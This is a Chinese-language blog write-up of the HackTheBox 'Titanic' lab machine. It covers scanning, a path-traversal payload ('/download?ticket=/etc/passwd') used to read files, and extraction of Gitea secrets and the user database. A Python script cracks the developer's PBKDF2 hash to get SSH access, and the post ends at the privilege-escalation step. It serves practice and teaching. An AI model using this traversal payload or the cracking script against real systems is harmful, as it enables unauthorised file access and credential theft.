@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  
+  
+  <title>HTB-Titanic | lvzhouhang</title>
+  <link rel="canonical" href="https://lvzhouhang.xyz/2025/05/09/HTB-Titanic/">
+  <meta name="author" content="lvzhouhang" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="靶机" />
+  
+  <meta name="description" content="信息搜集12345678910111213141516171819202122232425262728293031323334353637383940414243root@kali:~# rustscan -a 10.10.11.55.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Titanic">
+<meta property="og:url" content="https://lvzhouhang.xyz/2025/05/09/HTB-Titanic/index.html">
+<meta property="og:site_name" content="lvzhouhang">
+<meta property="og:description" content="信息搜集12345678910111213141516171819202122232425262728293031323334353637383940414243root@kali:~# rustscan -a 10.10.11.55.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-09T08:43:33.000Z">
+<meta property="article:modified_time" content="2025-05-09T09:39:13.291Z">
+<meta property="article:author" content="lvzhouhang">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kr-core.min.css" media="all"></link>
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/highlight.js/night-eighties.min.css" media="all"></link>
+  
+  <link rel="stylesheet" id="theme-light-css" href="/css/kr-theme/light.min.css" media="all"></link>
+  <link rel="stylesheet" id="theme-dark-css" href="/css/kr-theme/dark.min.css" media="(prefers-color-scheme: dark)"></link>
+  <script src="/js/kr-theme.min.js"></script>
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></link>
+  
+    <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></link>
+  
+  
+    <link rel="stylesheet" href="/vendors/viewerjs@1.11.6/dist/viewer.min.css"></link>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  
+    <script src="/vendors/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
+  
+  <!-- 自定义站点横幅和背景 -->
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('https://dev.krt.moe/demo-assets/banner.webp');
+      }
+      html[data-theme="dark"] .kratos-cover.kratos-cover-2 {
+        background-image: url('https://dev.krt.moe/demo-assets/banner_dark.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
+        }
+        html[data-theme="dark"] body.custom-background {
+          background-image: url('https://dev.krt.moe/demo-assets/bg.webp');
+        }
+      }
+    
+    
+      .widget-kratos-about .photo-background {
+        background-image: url('/images/default.webp');
+      }
+      html[data-theme="dark"] .widget-kratos-about .photo-background {
+        background-image: url('/images/default.webp');
+      }
+    
+  </style>
+
+  <!-- 额外的追加注入项 -->
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    <li>
+                                        
+                                            <a href="/">
+                                        
+                                            
+                                                <i class="fa fa-home"></i>
+                                            
+                                            首页
+                                        </a>
+                                        
+                                    </li>
+                                
+                                    <li>
+                                        
+                                            <a href="/archives/">
+                                        
+                                            
+                                                <i class="fa fa-file"></i>
+                                            
+                                            档案馆
+                                        </a>
+                                        
+                                    </li>
+                                
+                                    <li>
+                                        
+                                            <a href="/about/">
+                                        
+                                            
+                                                <i class="fa fa-user"></i>
+                                            
+                                            关于
+                                        </a>
+                                        
+                                    </li>
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">lvzhouhang</a></div>
+                    <div id="kratos-nav-toggle-wrapper" class="nav-toggle">
+                        <a id="kratos-nav-toggle" class="kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>lvzhouhang</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+
+
+        
+
+            
+
+            <section class="kr-main-col col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/05/09/HTB-Titanic/">
+    <div class="kratos-hentry kratos-page-inner clearfix">
+        <header class="kratos-page-header">
+            
+                <h1 class="kratos-page-title text-center" itemprop="name headline">HTB-Titanic</h1>
+            
+            <ul class="kratos-page-meta text-center">
+                <li><time datetime="2025-05-09T08:43:33.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2025-05-09</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">lvzhouhang</span>
+                </li>
+                
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~11.91K
+                        
+                        字
+                    </li>
+                
+                
+                
+            </ul>
+        </header>
+        <div class="kratos-page-content kr-post">
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class" >
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gitea"><span class="toc-number">3.</span> <span class="toc-text">Gitea</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# rustscan -a 10.10.11.55</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: https://discord.gg/GFrQsGy           :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">Nmap? More like slowmap.🐢</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">Open 10.10.11.55:22</span><br><span class="line">Open 10.10.11.55:80</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line">[&gt;] Script to be run Some(&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;)</span><br><span class="line"></span><br><span class="line">[~] Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 08:25 UTC</span><br><span class="line">Initiating Ping Scan at 08:25</span><br><span class="line">Scanning 10.10.11.55 [4 ports]</span><br><span class="line">Completed Ping Scan at 08:25, 0.18s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 08:25</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 08:25, 0.00s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">Initiating SYN Stealth Scan at 08:25</span><br><span class="line">Scanning 10.10.11.55 [2 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.55</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.55</span><br><span class="line">Completed SYN Stealth Scan at 08:25, 0.52s elapsed (2 total ports)</span><br><span class="line">Nmap scan report for 10.10.11.55</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.26s latency).</span><br><span class="line">Scanned at 2025-05-09 08:25:00 UTC for 1s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63</span><br><span class="line">80/tcp open  http    syn-ack ttl 63</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds</span><br><span class="line">           Raw packets sent: 6 (240B) | Rcvd: 6 (236B</span><br></pre></td></tr></table></figure>
+
+<p>开放了22和80端口</p>
+<p>80端口会自动跳转<code>titanic.htb</code>域名，添加一下host</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.55 titanic.htb</span><br></pre></td></tr></table></figure>
+
+<p>枚举一下子域名可以发现有一个<code>dev</code>,同样添加进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.55 titanic.htb dev.titanic.htb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/tmp]</span><br><span class="line">└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 28 -u &quot;http://10.10.</span><br><span class="line">11.55&quot; -H &quot;Host: FUZZ.titanic.htb&quot;</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.10.11.55/</span><br><span class="line">Total requests: 220559</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload</span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000001:   400        10 L     35 W       303 Ch      &quot;# directory-list-2.3-medium.txt&quot;</span><br><span class="line">000000003:   400        10 L     35 W       303 Ch      &quot;# Copyright 2007 James Fisher&quot;</span><br><span class="line">000000007:   400        10 L     35 W       303 Ch      &quot;# license, visit http://creativecommons.org/licenses/b</span><br><span class="line">                                                        y-sa/3.0/&quot;</span><br><span class="line">000000010:   400        10 L     35 W       303 Ch      &quot;#&quot;</span><br><span class="line">000000011:   400        10 L     35 W       303 Ch      &quot;# Priority ordered case-sensitive list, where entries</span><br><span class="line">                                                        were found&quot;</span><br><span class="line">000000009:   400        10 L     35 W       303 Ch      &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;</span><br><span class="line">000000005:   400        10 L     35 W       303 Ch      &quot;# This work is licensed under the Creative Commons&quot;</span><br><span class="line">000000013:   400        10 L     35 W       303 Ch      &quot;#&quot;</span><br><span class="line">000000008:   400        10 L     35 W       303 Ch      &quot;# or send a letter to Creative Commons, 171 Second Str</span><br><span class="line">                                                        eet,&quot;</span><br><span class="line">000000006:   400        10 L     35 W       303 Ch      &quot;# Attribution-Share Alike 3.0 License. To view a copy</span><br><span class="line">                                                        of this&quot;</span><br><span class="line">000000012:   400        10 L     35 W       303 Ch      &quot;# on at least 2 different hosts&quot;</span><br><span class="line">000000002:   400        10 L     35 W       303 Ch      &quot;#&quot;</span><br><span class="line">000000004:   400        10 L     35 W       303 Ch      &quot;#&quot;</span><br><span class="line">000000834:   200        275 L    1278 W     13870 Ch    &quot;dev&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>点击右上角的booknow后填写完信息，然后抓包，可以发现一个download的一个路由，将其修改成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?ticket=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>发现可以进行任意文件读取,可以直接读取user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?ticket=/home/developer/user.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h1><p>前面的<code>dev.titanic.htb</code>是一个gitea的网站，版本是<code>1.22.1 </code>,点击左上角的探索跳转到了一个仓库，然后有gitea和mysql的docker-compose.yml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#gitea</span><br><span class="line">version: &#x27;3&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  gitea:</span><br><span class="line">    image: gitea/gitea</span><br><span class="line">    container_name: gitea</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;127.0.0.1:3000:3000&quot;</span><br><span class="line">      - &quot;127.0.0.1:2222:22&quot;  # Optional for SSH access</span><br><span class="line">    volumes:</span><br><span class="line">      - /home/developer/gitea/data:/data # Replace with your path</span><br><span class="line">    environment:</span><br><span class="line">      - USER_UID=1000</span><br><span class="line">      - USER_GID=1000</span><br><span class="line">    restart: always</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#mysql</span><br><span class="line">version: &#x27;3.8&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  mysql:</span><br><span class="line">    image: mysql:8.0</span><br><span class="line">    container_name: mysql</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;127.0.0.1:3306:3306&quot;</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: &#x27;MySQLP@$$w0rd!&#x27;</span><br><span class="line">      MYSQL_DATABASE: tickets </span><br><span class="line">      MYSQL_USER: sql_svc</span><br><span class="line">      MYSQL_PASSWORD: sql_password</span><br><span class="line">    restart: always</span><br></pre></td></tr></table></figure>
+
+<p>可以知道gitea的路径和mysql的密码，gitea的配置文件默认在<code>/etc/gitea/conf/app.ini</code>这里可能是在<code>/home/developer/gitea/conf/app.ini</code>不对，那就是<code>/home/developer/gitea/data/gitea/conf/app.ini</code>这下对了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">PP_NAME = Gitea: Git with a cup of tea</span><br><span class="line">RUN_MODE = prod</span><br><span class="line">RUN_USER = git</span><br><span class="line">WORK_PATH = /data/gitea</span><br><span class="line"></span><br><span class="line">[repository]</span><br><span class="line">ROOT = /data/git/repositories</span><br><span class="line"></span><br><span class="line">[repository.local]</span><br><span class="line">LOCAL_COPY_PATH = /data/gitea/tmp/local-repo</span><br><span class="line"></span><br><span class="line">[repository.upload]</span><br><span class="line">TEMP_PATH = /data/gitea/uploads</span><br><span class="line"></span><br><span class="line">[server]</span><br><span class="line">APP_DATA_PATH = /data/gitea</span><br><span class="line">DOMAIN = gitea.titanic.htb</span><br><span class="line">SSH_DOMAIN = gitea.titanic.htb</span><br><span class="line">HTTP_PORT = 3000</span><br><span class="line">ROOT_URL = http://gitea.titanic.htb/</span><br><span class="line">DISABLE_SSH = false</span><br><span class="line">SSH_PORT = 22</span><br><span class="line">SSH_LISTEN_PORT = 22</span><br><span class="line">LFS_START_SERVER = true</span><br><span class="line">LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4</span><br><span class="line">OFFLINE_MODE = true</span><br><span class="line"></span><br><span class="line">[database]</span><br><span class="line">PATH = /data/gitea/gitea.db</span><br><span class="line">DB_TYPE = sqlite3</span><br><span class="line">HOST = localhost:3306</span><br><span class="line">NAME = gitea</span><br><span class="line">USER = root</span><br><span class="line">PASSWD = </span><br><span class="line">LOG_SQL = false</span><br><span class="line">SCHEMA = </span><br><span class="line">SSL_MODE = disable</span><br><span class="line"></span><br><span class="line">[indexer]</span><br><span class="line">ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve</span><br><span class="line"></span><br><span class="line">[session]</span><br><span class="line">PROVIDER_CONFIG = /data/gitea/sessions</span><br><span class="line">PROVIDER = file</span><br><span class="line"></span><br><span class="line">[picture]</span><br><span class="line">AVATAR_UPLOAD_PATH = /data/gitea/avatars</span><br><span class="line">REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars</span><br><span class="line"></span><br><span class="line">[attachment]</span><br><span class="line">PATH = /data/gitea/attachments</span><br><span class="line"></span><br><span class="line">[log]</span><br><span class="line">MODE = console</span><br><span class="line">LEVEL = info</span><br><span class="line">ROOT_PATH = /data/gitea/log</span><br><span class="line"></span><br><span class="line">[security]</span><br><span class="line">INSTALL_LOCK = true</span><br><span class="line">SECRET_KEY = </span><br><span class="line">REVERSE_PROXY_LIMIT = 1</span><br><span class="line">REVERSE_PROXY_TRUSTED_PROXIES = *</span><br><span class="line">INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8</span><br><span class="line">PASSWORD_HASH_ALGO = pbkdf2</span><br><span class="line"></span><br><span class="line">[service]</span><br><span class="line">DISABLE_REGISTRATION = false</span><br><span class="line">REQUIRE_SIGNIN_VIEW = false</span><br><span class="line">REGISTER_EMAIL_CONFIRM = false</span><br><span class="line">ENABLE_NOTIFY_MAIL = false</span><br><span class="line">ALLOW_ONLY_EXTERNAL_REGISTRATION = false</span><br><span class="line">ENABLE_CAPTCHA = false</span><br><span class="line">DEFAULT_KEEP_EMAIL_PRIVATE = false</span><br><span class="line">DEFAULT_ALLOW_CREATE_ORGANIZATION = true</span><br><span class="line">DEFAULT_ENABLE_TIMETRACKING = true</span><br><span class="line">NO_REPLY_ADDRESS = noreply.localhost</span><br><span class="line"></span><br><span class="line">[lfs]</span><br><span class="line">PATH = /data/git/lfs</span><br><span class="line"></span><br><span class="line">[mailer]</span><br><span class="line">ENABLED = false</span><br><span class="line"></span><br><span class="line">[openid]</span><br><span class="line">ENABLE_OPENID_SIGNIN = true</span><br><span class="line">ENABLE_OPENID_SIGNUP = true</span><br><span class="line"></span><br><span class="line">[cron.update_checker]</span><br><span class="line">ENABLED = false</span><br><span class="line"></span><br><span class="line">[repository.pull-request]</span><br><span class="line">DEFAULT_MERGE_STYLE = merge</span><br><span class="line"></span><br><span class="line">[repository.signing]</span><br><span class="line">DEFAULT_TRUST_MODEL = committer</span><br><span class="line"></span><br><span class="line">[oauth2]</span><br><span class="line">JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后读取数据库文件，下载下来用navicat打开</p>
+<p>可以拿到developer的密码为e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</p>
+<p>然后用脚本跑一下密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_hash</span>(<span class="params">password, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">    hash_value = hashlib.pbkdf2_hmac(</span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span>,</span><br><span class="line">        password.encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        salt,</span><br><span class="line">        iterations,</span><br><span class="line">        dklen</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_password</span>(<span class="params">dictionary_file, target_hash, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">    target_hash_bytes = binascii.unhexlify(target_hash)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            password = line.strip()</span><br><span class="line">            hash_value = pbkdf2_hash(password, salt, iterations, dklen)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在检查密码 <span class="subst">&#123;count&#125;</span>: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> hash_value == target_hash_bytes:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nFound password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Password not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">salt = binascii.unhexlify(<span class="string">&#x27;8bf3e3452b78544f8bee9400d6936d34&#x27;</span>)</span><br><span class="line">target_hash = <span class="string">&#x27;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&#x27;</span></span><br><span class="line">dictionary_file = <span class="string">&#x27;/usr/share/wordlists/rockyou.txt&#x27;</span></span><br><span class="line">find_matching_password(dictionary_file, target_hash, salt)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以爆破出来密码是<code>25282528</code>,ssh连接</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">developer@titanic:~$ sudo -l</span><br><span class="line">[sudo] password for developer:</span><br><span class="line">Sorry, user developer may not run sudo on titanic.</span><br></pre></td></tr></table></figure>
+
+<p>sudo没有东西</p>
